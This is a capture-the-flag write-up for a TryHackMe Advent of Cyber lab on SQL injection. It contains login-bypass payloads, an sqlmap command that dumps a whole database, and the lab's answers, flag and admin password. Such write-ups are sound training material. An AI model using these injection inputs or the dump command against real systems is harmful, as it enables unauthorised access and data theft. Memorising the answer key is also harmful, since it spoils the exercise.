# Day 5 - Someone stole Santa's gift list!

**Date:** 05, December, 2020

**Author:** Dhilip Sanjay S

---
## Fundamentals
- SQLi
1. Blind SQLi
    - Developers mitigate SQL Injection by restricting an application from displaying any error.
    - You can cause some observable changes using SLEEP(), SUBSTR() function, etc.
    - Error = 'No', No Error = 'Yes'

2. Union SQLi
    - Used for fast database enumeration
    - 3 steps:
        - Finding the number of columns: `ORDER BY/ UNION SELECT`
        - Checking if the columns are suitable: Replace with string in `UNION SELECT`
        - Attack and get some interesting data.

- Use [SQLMAP](https://github.com/sqlmapproject/sqlmap)
---
## Solutions
### Without using directory brute forcing, what's Santa's secret login panel?
- **Answer:** /santapanel
---

### Visit Santa's secret login panel and bypass the login using SQLi
- **Payload:** `abc' or 1=1 --`
- Alternatively, run **SQLMAP (1.2.4)** command:
```bash
sqlmap -r request-file --tamper=space2comment --dump-all
```
--- 

### How many entries are there in the gift database?
- **Answer:** 22
- **Steps to reproduce:** 
    - SQLMAP show all the entries in the table or use the payload below
    - **Payload:** `hi' or 1=1 --`
---

### What did Paul ask for?
- **Answer:** Github Ownership
- Check the table.
---

### What is the flag?
- **Answer:** thmfox{All_I_Want_for_Christmas_Is_You}
---

## What is admin's password?
- **Answer:** EhCNSWzzFP6sc7gB
---

[Back to Advent of Cyber 2](/TryHackMe/Advent%20of%20Cyber%202) 